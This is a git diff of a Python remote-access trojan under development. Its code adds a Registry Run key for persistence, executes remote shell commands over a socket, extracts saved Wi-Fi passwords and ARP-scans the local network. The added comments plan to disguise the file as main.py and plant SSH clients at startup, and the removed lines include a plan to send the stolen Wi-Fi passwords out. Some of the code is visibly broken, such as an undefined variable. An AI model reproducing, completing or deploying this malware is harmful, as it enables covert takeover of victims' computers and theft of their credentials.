@@ -1,4 +1,10 @@
 #!/usr/bin/env python3
+"""
+change server name  to main.py
+serve it as file and start the handler wich has custom code exec
+needs to be debuged
+ssh clients needs to be planted in reg or startup
+"""
 from urllib.request import urlopen
 import urllib
 import socket
@@ -11,10 +17,7 @@ import sys
 import shutil
 import re
 import scapy.all as scapy
-
-
-
-
+from time import sleep
 class MotherFucker():
     def __init__(self, ip, port):
 	self.persistence()
@@ -25,6 +28,9 @@ class MotherFucker():
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
             subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)
+    def check_status(self):
+        pass
+
     def cmd_send(self, data):
         json_send = json.dumps(data)
         self.connection.send(json_send)
@@ -51,7 +57,6 @@ class MotherFucker():
     def exec_command(self, command):
         return subprocess.check_output(command, shell=True)
     def get_ip():
-        # Gets public IP address of this network.
         data = str(urlopen('http://checkip.dyndns.com/').read())
         ip = socket.gethostbyname(socket.gethostname())
         private = ip
@@ -68,8 +73,6 @@ class MotherFucker():
             return pass_regex.search(wlan).group(1)
         except:
             return " "
-    #TODO: send the wifi passes through smtp or ftp or maybe read them dynamicly
-
     def arp_scan(self):
         # scans the entire network 
         ip = self.get_ip.private
@@ -137,5 +140,10 @@ class MotherFucker():
 
             self.cmd_send(cmd_rslt)
 if __name__ == "__main__":
-    app = MotherFucker("127.0.0.1", "80")
-    app.run()
+    try:
+        if status == "true":
+            app = MotherFucker("127.0.0.1", "80")
+            app.run()
+        sleep(10)
+    except Exception:
+        pass
